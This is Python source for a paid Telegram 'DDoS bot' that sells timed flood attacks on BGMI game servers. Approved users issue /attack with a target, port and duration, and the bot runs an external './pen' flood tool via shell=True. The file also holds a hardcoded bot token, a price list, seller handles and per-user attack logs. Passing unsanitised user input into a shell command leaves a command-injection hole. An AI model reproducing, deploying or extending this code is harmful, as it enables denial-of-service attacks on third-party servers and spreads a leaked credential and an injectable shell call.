import telebot
import subprocess
import datetime
import os
from typing import List, Dict

# Load bot token from environment variable or hardcode it
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7352197869:AAFgRrWL9SjBZiWgSj4BRDTEk28ex8FyI8o')
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs
admin_id = ["1847934841", "6683318395", "6073143283"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Dictionary to store the approval expiry date for each user
user_approval_expiry: Dict[str, datetime.datetime] = {}

# Dictionary to store the last time each user ran the /attack command
bgmi_cooldown: Dict[str, datetime.datetime] = {}

COOLDOWN_TIME = 3  # Cooldown time in seconds

# Function to read user IDs from the file
def read_users() -> List[str]:
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to log command to the file
def log_command(user_id: str, target: str, port: int, time: int):
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to record command logs
def record_command_logs(user_id: str, command: str, target: str = None, port: int = None, time: int = None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id: str) -> str:
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id: str, duration: int, time_unit: str) -> bool:
    current_time = datetime.datetime.now()
    if time_unit in ("hour", "hours"):
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ("day", "days"):
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ("week", "weeks"):
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ("month", "months"):
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            allowed_user_ids = read_users()
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

# Command handler for removing a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            allowed_user_ids = read_users()
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji 🙇."

    bot.reply_to(message, response)

# Command handler for clearing logs
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs cleared successfully ✅"
        except FileNotFoundError:
            response = "No logs found to clear."
    else:
        response = "You have not purchased yet. Purchase now from:- @NEXION_OWNER ❄."

    bot.reply_to(message, response)

# Command handler for clearing users
@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Users are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Users cleared successfully ✅"
        except FileNotFoundError:
            response = "No users found to clear."
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji 🙇."

    bot.reply_to(message, response)

# Command handler for showing all users
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji ❄."

    bot.reply_to(message, response)

# Command handler for showing recent logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji ❄."
        bot.reply_to(message, response)

# Function to handle the reply when users run the /attack command
def start_attack_reply(message, target: str, port: int, time: int):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀𝙃𝙞 {username} 🚀, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target} : {port} 𝙛𝙤𝙧 {time} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨\n\n❗️❗️ 𝙋𝙇𝙀𝘼𝙎𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝘿𝙗𝙖𝙘𝙠 ❗️❗️"
    bot.reply_to(message, response)

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    allowed_user_ids = read_users()
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 240:
                response = "Error: Time interval must be less than 240."
                bot.reply_to(message, response)
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./pen {target} {port} {time} 350 60"
                process = subprocess.run(full_command, shell=True)
                # Send the final response
                response = f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target} : {port} 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅"
                bot.reply_to(message, response)
        else:
            response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
            bot.reply_to(message, response)
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. DM TO BUY ACCESS:- @police_Ji")
        bot.reply_to(message, response)

# Command handler for showing user logs
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    allowed_user_ids = read_users()
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

# Command handler for showing help
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
🗡️ /attack : Method For Bgmi Servers. 
🗡️ /rules : Please Check Before Use !!.
🗡️ /mylogs : To Check Your Recents Attacks.
🗡️ /plan : Checkout Our Botnet Rates.
🗡️ /myinfo : TO Check Your WHOLE INFO.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @police_Ji
Official Channel :- https://t.me/NEXION_Gaming
'''
    bot.reply_to(message, help_text)

# Command handler for starting the bot
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
🤖Try To Run This Command : /help 
✅BUY :- @police_Ji'''
    bot.reply_to(message, response)

# Command handler for showing rules
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Don't Run Too Many Attacks !! Cause A Ban From Bot
2. Don't Run 2 Attacks At Same Time Because You Will Get Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/NEXION_GAMEING OTHERWISE IT WILL NOT WORK
4. We Daily Check The Logs So Follow These Rules To Avoid Ban!!'''
    bot.reply_to(message, response)

# Command handler for showing plans
@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerful Than Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 240 (S)
> After Attack Limit : 10 sec
-> Concurrent Attacks : 5

Price List💸 :
Day-->99 Rs
Week-->399 Rs
Month-->1199 Rs
'''
    bot.reply_to(message, response)

# Command handler for showing admin commands
@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

# Command handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
